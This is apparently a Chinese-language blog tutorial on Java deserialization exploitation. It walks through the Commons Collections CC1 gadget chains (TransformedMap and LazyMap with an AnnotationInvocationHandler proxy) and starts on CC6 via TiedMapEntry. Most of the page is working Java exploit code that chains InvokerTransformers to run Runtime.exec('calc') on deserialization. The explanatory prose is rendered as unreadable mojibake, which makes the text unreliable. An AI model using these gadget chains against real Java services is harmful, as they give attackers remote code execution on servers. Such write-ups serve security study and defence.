<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class, Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>, <span class="literal">null</span>}),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class, Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>, <span class="literal">null</span>}),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        });</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer =  new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"value"</span>,<span class="string">"v"</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerconstructor</span> <span class="operator">=</span> annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntime = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime currentRuntime = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(currentRuntime);</span></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    {</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    {</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æŠŠé“¾å­å€’ç€æ¨äº†ä¸€éï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»æˆ‘ä»¬ç¼–å†™payloadçš„æœ€åå¼€å§‹è§¦å‘çš„ï¼Œä¹Ÿå°±æ˜¯<code>AnnotationInvocationHandler</code>çš„readObjectæ–¹æ³•ï¼Œå¦‚æœè¿˜æœ‰ä¸æ‡‚çš„åœ°æ–¹å¯ä»¥ä¸‹æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ã€‚</p>
<h1 id="ç¬¬äºŒæ¡é“¾å­ï¼š"><a href="#ç¬¬äºŒæ¡é“¾å­ï¼š" class="headerlink" title="ç¬¬äºŒæ¡é“¾å­ï¼š"></a>ç¬¬äºŒæ¡é“¾å­ï¼š</h1><p>æˆ‘ä»¬åœ¨ç¬¬ä¸€æ¡é“¾å­ä¸­æ‰¾InvokerTransformer.transformçš„ä¸‹ä¸€è°ƒç”¨æ—¶å½“æ—¶æ‰¾åˆ°äº†ä¸¤ä¸ªMapï¼Œä½†åæ¥æˆ‘ä»¬å°†ä¸‰ä¸ªInvokerTransfomerå°è£…è¿›äº†ä¸€ä¸ªChainedTransformerä¸­ï¼Œæ‰€ä»¥å…¶å®åœ¨ChainedTransformerçš„trnasformä¸­è°ƒç”¨çš„è¿˜æ˜¯InvokerTransformerçš„transformæ–¹æ³•ï¼Œå› æ­¤æ‰¾InvokerTransformer.transformå’Œæ‰¾ChainedTransformer.transformçš„åç»­ç”¨æ³•æ˜¯ä¸€æ ·çš„,ç¬¬ä¸€æ¡é“¾ä¸­åˆ©ç”¨çš„æ˜¯TransformedMapï¼Œè¿˜æœ‰å¦å¤–ä¸€ä¸ªLazyMapï¼Œå…¶ä¸­çš„getæ–¹æ³•è°ƒç”¨äº†transformï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œè·Ÿä¸‹å»ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> {</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) {</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143114129.png"></p>
<p>çœ‹ä¸€ä¸‹LazyMapï¼Œgetæ–¹æ³•ä¸­å­˜åœ¨factory.transformï¼Œfactoryæ„é€ å‡½æ•°å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†factoryä¼ å€¼ä¸ºChainedTransformerï¼Œå¹¶ä¸”è¿›å…¥ifåˆ¤æ–­ï¼Œmapä¸­æ²¡æœ‰keyæ‰ä¼šè§¦å‘transform:</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> {</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">this</span>.factory = factory;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> {</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) {</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æ¥ç€æ‰¾è°è°ƒç”¨äº†getï¼Œfindusagesç»“æœå…­åƒå¤šæ¡æˆ‘å°±ä¸æ‰¾äº†ï¼Œæœ€ç»ˆæ˜¯é”å®šåœ¨äº†<code>AnnotationInvocationHandler.invoke</code>ä¸Šï¼ŒmemberValuesæ˜¯æ„é€ å‡½æ•°ä¼ å…¥çš„ä¸€ä¸ªMapï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(membjieker);</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)</span><br></pre></td></tr></tbody></table></figure>

<p>ç”±äº<code>AnnotationInvocationHandler</code>æ˜¯ä¸€ä¸ª<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Justin_bibo/article/details/114888702">åŠ¨æ€ä»£ç†è°ƒç”¨å¤„ç†å™¨ç±»<i class="fas fa-external-link-alt"></i></a>ï¼Œå½“åœ¨åŠ¨æ€ä»£ç†ä¸­è°ƒç”¨<code>AnnotationInvocationHandler</code>çš„æ–¹æ³•æ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨invokeï¼Œè¿™é‡Œç»™å‡ºçš„æ˜¯<code>AnnotationInvocationHandler.readObject</code>ï¼Œå¯ä»¥è¯´æ˜¯å¾ˆå·§äº†ï¼Œé€šè¿‡è‡ªå·±è°ƒç”¨è‡ªå·±ï¼Œå…¶å®ç”¨å…¶ä»–çš„ç±»ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£çš„ç‚¹ï¼Œæˆ‘ä»¬æ¥çœ‹è°ƒç”¨è¿‡ç¨‹ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143014958.png"></p>
<p>å…ˆçœ‹invokeï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">"equals"</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">    <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">"Too many parameters for an annotation method"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br></pre></td></tr></tbody></table></figure>

<p>æƒ³è¦æ‰§è¡Œgetæ–¹æ³•æˆ‘ä»¬è¦ä¿è¯å‰é¢çš„ä¸¤ä¸ªifä¸èƒ½æ‰§è¡Œï¼Œé¦–å…ˆæ–¹æ³•åä¸èƒ½ä¸ºequalsï¼Œå¹¶ä¸”è¦æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•ï¼Œåœ¨readObjectä¸­æ°å¥½è°ƒç”¨äº†memberValuesçš„entrySetæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æ­£å‘æ¢³ç†ä¸€ä¸‹æµç¨‹ï¼š</p>
<ul>
<li>å…±éœ€è¦ä¸¤ä¸ªAnnotationInvocationHandlerï¼Œç¬¬ä¸€ä¸ªAIHä¸­memberValuesä¸ºProxyï¼ˆä»£ç†äº†ç¬¬äºŒä¸ªAnnotationInvocationHandlerçš„åŠ¨æ€ä»£ç†ï¼‰ï¼Œè¿™æ ·é€šè¿‡è°ƒç”¨Proxy.entrySetæ¥è§¦å‘Proxyçš„invokeï¼ŒProxyä¸­AIHçš„memberValuesä¸ºLazyMapï¼Œåœ¨Proxyçš„invokeä¸­è°ƒç”¨äº†LazyMap.getï¼Œè§¦å‘ChainedTransformer.transformï¼Œå‰©ä¸‹çš„è§¦å‘ç‚¹å°±å’Œä¹‹å‰çš„ç¬¬ä¸€æ¡é“¾ä¸€æ ·äº†ã€‚</li>
</ul>
<p><strong>å¼€å§‹æ“payloadï¼š</strong></p>
<p>ç”±äºå‰é¢çš„Transformeréƒ¨åˆ†éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æŠŠåœ¨CC1ä¸­ç”ŸæˆChainedTrnasformerå°è£…åˆ°äº†ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ä¸­ï¼Œè¿™æ ·åœ¨ä¹‹åçš„é“¾å­ä¸­å¦‚æœç”¨åˆ°äº†ChainedTransformerç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•å³å¯ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143045565.png"></p>
<p>LazyMapæœ‰ä¸¤ä¸ªdecorateæ–¹æ³•å’Œä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬è¦ç”¨çš„æ˜¯æ¥æ”¶mapå’ŒTransformerçš„decorateå’Œæ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> {</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>paylaodï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> getChain.getChainedTransformer();</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,ctf);</span><br></pre></td></tr></tbody></table></figure>

<p>åŠ¨æ€ä»£ç†ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> getChain.getChainedTransformer();</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,ctf);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">AIH</span> <span class="operator">=</span> Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">AIHC</span> <span class="operator">=</span> AIH.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AIHC.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">AIHCIH</span> <span class="operator">=</span> (InvocationHandler) AIHC.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]{Map.class},AIHCIH);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> AIHC.newInstance(Override.class,mapProxy);</span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">"ser.bin"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬åœ¨å®ä¾‹åŒ–InvocationHandleræ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªæ³¨è§£å‚æ•°ä¸éœ€è¦å†æ˜¯<code>Target</code>ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ä¸å†éœ€è¦readObjectä¸­çš„<code>setValue</code>ï¼Œè€Œæ˜¯ç›´æ¥åœ¨éå†mapæ—¶åˆ©ç”¨<code>memberValues.entrySet()</code>ã€‚</p>
<p>CC1çš„ä¸¤æ¡åˆ©ç”¨é“¾:</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143129393.png"></p>
<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>åœ¨jdk8u71ä¸­å¯¹CommonsCollections1åšå‡ºäº†ä¿®å¤ï¼Œä¸»è¦æ˜¯åœ¨<code>AnnotationInvocationHandler.readObject</code>ä¸­åšå‡ºäº†ä¿®æ”¹ï¼Œé’ˆå¯¹<code>checkSetValue</code>é“¾ä¸­ï¼ŒreadObjectä¸­æ•´ä¸ªç§»é™¤äº†å¯¹<code>checkSetValue</code>çš„æ“ä½œï¼Œé’ˆå¯¹<code>LazyMap</code>é“¾åˆ™å°†<code>memberValues</code>è®¾ç½®ä¸ºäº†å®¢æˆ·ç«¯ä¸å¯æ§ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªFiledç±»æ¥è¿›è¡Œè¯»å–ã€‚æˆ‘ä»¬åœ¨å®é™…è¿›è¡Œååºåˆ—åŒ–çš„æ”»å‡»æ—¶ï¼Œå¦‚æœä½¿ç”¨CC1æ¥æ”»å‡»æ—¶ï¼Œä¸€æ—¦jdkç‰ˆæœ¬æ›´æ”¹åŸæœ‰çš„gadgetchainå°±æ— æ³•ä½¿ç”¨ï¼Œè¿™æ ·å¯¹æˆ‘ä»¬çš„æ”»å‡»è¿›è¡Œäº†æå¤§çš„å—é™ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªå—jdkç‰ˆæœ¬å½±å“å¯¹çš„gadgetchainå‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹CC6ã€‚</p>
<p>ysoserialä¸­ç»™å‡ºçš„gadgetchainï¼Œå¯ä»¥çœ‹åˆ°é“¾å­ååŠæˆªç›´åˆ°<code>LazyMap.get()</code>å’Œæˆ‘ä»¬CC1çš„LazyMapé“¾æ˜¯ä¸€æ ·çš„ï¼š </p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143314008.png"></p>
<p>å†å¾€ä¸Šçœ‹æˆ‘ä»¬å‘ç°è§¦å‘ç‚¹æ˜¯<code>HashMap.hash</code>ï¼Œè¿™é‡Œå’Œ<a class="link" target="_blank" rel="noopener" href="https://www.notion.so/URLDNS-8a6e81f093e146879b842c75ce902273">URLDNS<i class="fas fa-external-link-alt"></i></a>ä¸­éå¸¸åƒäº†ï¼Œé€šè¿‡å‘<code>HashMap</code>putä¸€ä¸ªé”®å€¼å¯¹ï¼Œé‚£ä¹ˆåœ¨HashMapçš„readobjectä¸­å°±ä¼šå¯¹Mapçš„é”®å€¼å¯¹è¿›è¡Œéå†ï¼Œå¹¶ä¸”å¯¹æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„keyè¿›è¡Œhashï¼Œåœ¨è¿›è¡Œhashæ—¶ä¼šå¯¹keyè¿›è¡ŒhashCodeã€‚</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143245908.png"></p>
<p>æ ¹æ®ä¸Šé¢ysoserialç»™å‡ºçš„gadgetchainï¼Œæˆ‘ä»¬å‘ç°æ‰€éœ€è¦è°ƒç”¨çš„hashCodeçš„ç±»å°±æ˜¯<code>TiedMapEntry</code>ï¼Œgadgetchainè¡¥å……å®Œä¹‹åå°±æ˜¯è¿™æ ·äº†ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143301864.png"></p>
<p>æˆ‘ä»¬æ¥çœ‹è¿™ä¸ªTiedMapEntryï¼Œå®ƒçš„æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªMapå’Œä¸€ä¸ªkeyï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç±»å‚¨å­˜çš„é”®å€¼å¯¹æ ¼å¼æ˜¯ Map-keyï¼Œï¼ˆæ³¨æ„è¿™é‡Œkeyåªæ˜¯ä¸€ä¸ªåå­—ï¼Œæˆ‘ä»¬é€šå¸¸è¯´çš„key-valueä¸€èˆ¬æ¥è¯´æ˜¯keyåœ¨å‰ï¼Œvalueåœ¨åï¼Œä½†keyæ˜¯å¦åœ¨å‰æ˜¯ä¸ä¸€å®šçš„ï¼ŒHashMapä¸­ä»¥Key-valueæ ¼å¼å‚¨å­˜é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯¹äºHashMapæ¥è¯´åœ¨å‰é¢çš„å°±æ˜¯keyï¼Œè€ŒTiedMapEntryä»¥Map-keyå½¢å¼å‚¨å­˜é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯¹å®ƒæ¥è¯´keyå°±åœ¨åé¢ï¼‰æˆ‘ä»¬å°†lazymapæ‰”åˆ°TiedMapEntryä¸­ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> getChain.getChainedTransformer();</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,ctf);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">"123"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>å†å°†<code>tiedMapEntry</code>ä½œä¸ºé”®å€¼å‚¨å­˜åˆ°HashMapä¸­ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> getChain.getChainedTransformer();</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,ctf);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">"123"</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">"123"</span>);</span><br><span class="line">serialize(hashMap);</span><br></pre></td></tr></tbody></table></figure>

<p>ä½†æ˜¯è¿™é‡Œä¾ç„¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¿è¡Œä¸€ä¸‹ä¸Šé¢çš„ä»£ç ä¼šå‘ç°æˆ‘æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–ä¹Ÿå¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨URLDNSä¸­å°±é‡åˆ°è¿‡ï¼Œå½“åºåˆ—åŒ–æ—¶ï¼Œåœ¨æˆ‘ä»¬put<code>tiedMapEntry</code>æ—¶å°±å·²ç»è§¦å‘äº†hashCodeï¼Œè®¡ç®—å™¨å°±ä¼šå¼¹å‡ºï¼Œå¹¶ä¸æ˜¯é€šè¿‡ååºåˆ—åŒ–æ¥è§¦å‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åŠ ä¸€æ®µä»£ç é˜²æ­¢åœ¨putæ—¶å°±å¼¹è®¡ç®—å™¨ï¼Œæˆ‘è¿™é‡Œæ˜¯åœ¨decorateæ—¶ï¼Œä¼ ä¸€ä¸ªæ— æ•ˆçš„Transformerï¼Œputæ—¶å°±ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œåœ¨åºåˆ—åŒ–å‰å°†factoré€šè¿‡åå°„ä¿®æ”¹å›å»ï¼Œååºåˆ—åŒ–çš„ç»“æœå°±ä¸ä¼šå—åˆ°å½±å“ï¼š</p>
